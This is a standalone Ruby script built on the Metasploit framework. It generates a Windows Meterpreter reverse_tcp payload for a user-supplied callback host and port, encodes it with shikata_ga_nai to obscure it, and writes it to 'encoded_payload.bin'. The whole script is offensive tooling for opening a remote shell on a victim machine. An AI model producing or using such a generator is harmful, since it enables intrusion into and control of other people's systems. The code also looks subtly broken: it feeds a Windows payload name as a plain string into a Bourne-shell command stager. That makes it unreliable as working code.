#!/usr/bin/env ruby
# frozen_string_literal: true

require 'msf/core'

class CustomPayloadGenerator
  def initialize(lhost, lport)
    @lhost = lhost
    @lport = lport
  end

  def generate_payload
    base_payload = 'windows/meterpreter/reverse_tcp'

    options = {
      'LHOST' => @lhost,
      'LPORT' => @lport
    }

    payload = Rex::Exploitation::CmdStagerBourne.new(base_payload, options)

    encoded_payload = encode_payload(payload.generate, 'x86/shikata_ga_nai')

    puts "\n[+] Encoded Payload (shikata_ga_nai):"
    puts encoded_payload
    File.write('encoded_payload.bin', encoded_payload)

    puts "\n[+] Payload saved as 'encoded_payload.bin'"
  end

  private

  def encode_payload(raw_payload, encoder)
    framework = Msf::Simple::Framework.create
    encoder_instance = framework.encoders.create(encoder)

    unless encoder_instance
      puts "[-] Encoder not found."
      exit 1
    end

    begin
      encoded = encoder_instance.encode(raw_payload, 'BufferRegister' => 'EAX')
      return encoded
    rescue => e
      puts "[-] Encoding failed: #{e.message}"
      exit 1
    end
  end
end

lhost = ARGV[0]
lport = ARGV[1]

generator = CustomPayloadGenerator.new(lhost, lport)
generator.generate_payload
